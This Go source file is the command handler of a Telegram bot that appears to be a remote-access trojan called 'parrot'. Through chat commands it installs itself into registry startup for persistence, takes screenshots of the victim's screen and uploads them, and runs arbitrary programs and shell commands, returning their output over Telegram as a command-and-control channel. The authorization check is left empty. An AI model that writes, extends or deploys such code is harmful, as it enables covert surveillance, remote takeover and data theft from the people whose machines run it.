package telegraph

import (
	"fmt"
	"github.com/go-telegram-bot-api/telegram-bot-api"
	"internal/commands"
	"log"
	"os"
	"strings"
)

func (t Telegraphist) HandleCommand(update tgbotapi.Update) {
	log.Printf("[%s] %s", update.Message.From.UserName, update.Message.Text)

	if update.Message.IsCommand() {
		command := update.Message.Command()
		if command != "authorize" {

		}
		switch command {
		case "help":
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")
			msg.Text = strings.Join([]string{
				"List of commands:",
				"/help - shows this message",
				"/install - installs parrot and adds it to registry startup",
				"/screen - takes a commands",
				"/exec - executes a program in local context",
				"/cmd - runs a command (Be careful about using quotes)",
			}, "\n")
			_, err := t.bot.Send(msg)
			if err != nil {
				log.Panic(err)
			}
		case "install":
			ok, err := commands.Install(os.Args[0])
			if err != nil {
				t.ReportError(fmt.Sprintf("An error occured: %v", err), update.Message.Chat.ID)
			}
			if !ok {
				t.ReportError("Something went wrong :(", update.Message.Chat.ID)
			} else {
				t.ReportError("Success :)", update.Message.Chat.ID)
			}
		case "screen":
			img, err := commands.TakeScreenShot()
			if err != nil {
				errorText := fmt.Sprintf("An error occured during taking screenshot: %v", err)
				t.ReportError(errorText, update.Message.Chat.ID)
				log.Panic(err)
			}
			for _, img2send := range img {
				doc := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, img2send)
				_, err := t.bot.Send(doc)
				if err != nil {
					log.Panic(err)
				}
			}
		case "exec":
			cmd := strings.Join(strings.SplitAfter(update.Message.Text, "/exec")[1:], " ")
			out := commands.StartCommand(cmd)
			if len(out) > 4096 {
				doc := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, tgbotapi.FileBytes{
					Name:  "exec.txt",
					Bytes: []byte(out),
				})
				_, err := t.bot.Send(doc)
				if err != nil {
					log.Panic(err)
				}
			} else {
				_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, out))
				if err != nil {
					log.Panic(err)
				}
			}
		case "cmd":
			cmd := strings.Join(strings.SplitAfter(update.Message.Text, "/cmd")[1:], " ")
			out := commands.RunCommand(cmd)
			if len(out) > 4096 {
				doc := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, tgbotapi.FileBytes{
					Name:  "command.txt",
					Bytes: []byte(out),
				})
				_, err := t.bot.Send(doc)
				if err != nil {
					log.Panic(err)
				}
			} else {
				_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, out))
				if err != nil {
					log.Panic(err)
				}
			}

		default:
			_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "I don't know this command"))
			if err != nil {
				log.Panic(err)
			}
		}
	}
}
